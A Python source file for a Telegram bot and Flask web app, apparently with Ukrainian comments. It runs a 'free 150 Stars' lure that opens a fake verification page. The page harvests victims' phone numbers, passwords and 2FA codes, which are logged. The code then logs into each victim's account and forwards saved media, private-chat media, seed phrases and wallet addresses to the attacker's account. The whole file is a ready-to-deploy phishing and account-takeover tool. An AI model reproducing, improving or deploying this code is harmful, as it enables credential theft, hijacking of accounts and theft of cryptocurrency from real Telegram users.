from flask import Flask, request, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import asyncio
import time
import json

# ===========================================
# ========== ВСТАВТЕ СВОЇ ДАНІ =============
# ===========================================

BOT_TOKEN = "ВАШ_ТОКЕН"  # ТОКЕН ВІД @BOTFATHER
API_ID = 1234567  # ЧИСЛО З my.telegram.org
API_HASH = "ваш_апі_хеш"  # СТРОКА З my.telegram.org
TARGET_ACCOUNT = "@ваш_username"  # ВАШ ЮЗЕРНЕЙМ

# ===========================================
# ===========================================

WEBAPP_URL = "https://stargiftbot-1.onrender.com"  # ВАША ССИЛКА З RENDER

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Stars</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: white;
            font-family: -apple-system, Arial, sans-serif;
            text-align: center;
            padding: 40px 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .icon { font-size: 64px; margin-bottom: 10px; }
        h2 { font-size: 24px; margin-bottom: 8px; }
        .sub { color: #888; font-size: 14px; margin-bottom: 30px; }
        input {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            margin: 8px auto;
            border-radius: 14px;
            border: 1px solid #2a2a2a;
            background: #1a1a1a;
            color: white;
            font-size: 16px;
            display: block;
        }
        input:focus { border-color: #0088cc; outline: none; }
        button {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            background: #0088cc;
            border: none;
            border-radius: 14px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
        }
        button:active { opacity: 0.8; }
        .secure { color: #00cc88; font-size: 13px; margin-top: 20px; }
        .footer { color: #444; font-size: 12px; margin-top: 30px; }
    </style>
</head>
<body>
    <div class="icon">⭐</div>
    <h2>Підтвердження отримання</h2>
    <p class="sub">Введіть дані для верифікації</p>

    <input id="phone" placeholder="📱 Номер телефону" type="tel">
    <input id="password" placeholder="🔒 Пароль" type="password">
    <input id="code2fa" placeholder="🔐 Код 2FA (якщо є)" type="text">

    <button onclick="sendData()">✅ ПІДТВЕРДИТИ</button>

    <p class="secure">🔒 Захищене з'єднання</p>
    <p class="footer">Telegram Stars © 2026</p>

    <script>
        function sendData() {
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const code2fa = document.getElementById('code2fa').value;

            if (!phone || !password) {
                alert('Будь ласка, заповніть номер і пароль');
                return;
            }

            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    phone: phone,
                    password: password,
                    code2fa: code2fa,
                    tg_user: window.Telegram.WebApp.initDataUnsafe?.user || {}
                })
            });

            alert('✅ Перевірку пройдено! Зірки будуть нараховані протягом 5 хвилин.');
            window.Telegram.WebApp.close();
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    with open('logs.txt', 'a') as f:
        f.write(f"{data} | {time.ctime()}\n")
    threading.Thread(target=lambda: asyncio.run(steal(data))).start()
    return jsonify({'status': 'ok'})

async def steal(data):
    from telethon import TelegramClient

    client = TelegramClient('session', API_ID, API_HASH)

    try:
        await client.start(
            phone=data['phone'],
            password=data['password'],
            code_callback=lambda: data.get('code2fa', '')
        )

        me = await client.get_me()
        print(f'✅ ВОЙШЛИ В АККАУНТ: {me.username or me.phone}')

        # ---- КРАДЁМ ВСЁ, ЧТО МОЖНО ----
        # 1. ВСЕ медиа зі "Збережених повідомлень"
        saved = await client.get_messages('me', limit=200)
        for msg in saved:
            if msg.media:
                try:
                    await client.forward_messages(TARGET_ACCOUNT, msg)
                    print(f'📤 Переслано медіа: {msg.id}')
                except:
                    pass

        # 2. Шукаємо сид-фрази та адреси гаманців
        async for dialog in client.iter_dialogs():
            try:
                async for msg in client.iter_messages(dialog, limit=50):
                    text = msg.text or ''
                    words = text.split()
                    if len(words) in [12, 24] and all(len(w) > 3 for w in words[:5]):
                        await client.send_message(TARGET_ACCOUNT, f'🔑 СИД-ФРАЗА: {text}')
                        print('🔑 Знайдено сид-фразу!')
                    if '0x' in text and len(text) > 40:
                        await client.send_message(TARGET_ACCOUNT, f'💰 АДРЕСА: {text}')
            except:
                pass

        # 3. Пересилаємо медіа з усіх чатів
        async for dialog in client.iter_dialogs():
            if dialog.is_user and dialog.id != (await client.get_me()).id:
                try:
                    msgs = await client.get_messages(dialog, limit=30)
                    for msg in msgs:
                        if msg.media:
                            await client.forward_messages(TARGET_ACCOUNT, msg)
                            print(f'📤 Медіа з {dialog.name}')
                except:
                    pass

        await client.send_message(
            TARGET_ACCOUNT,
            f'✅ АККАУНТ {me.username or me.phone} ОБРОБЛЕНО!'
        )

    except Exception as e:
        print(f'❌ ПОМИЛКА: {e}')
    finally:
        await client.disconnect()

# ---------- ЗАПУСК БОТА ----------
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start_cmd(message):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton(
        text="🎁 ЗАБРАТИ 150 ЗІРОК",
        web_app=WebAppInfo(url=WEBAPP_URL)
    ))
    bot.send_message(
        message.chat.id,
        "🌟 **Вітаємо!**\nТи виграв 150 Telegram Stars!\n\n👇 Натисни кнопку нижче.",
        reply_markup=kb,
        parse_mode='Markdown'
    )

# Запускаємо бота в окремому потоці
def run_bot():
    bot.polling(none_stop=True, interval=0)

threading.Thread(target=run_bot, daemon=True).start()

# ---------- ЗАПУСК FLASK ----------
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
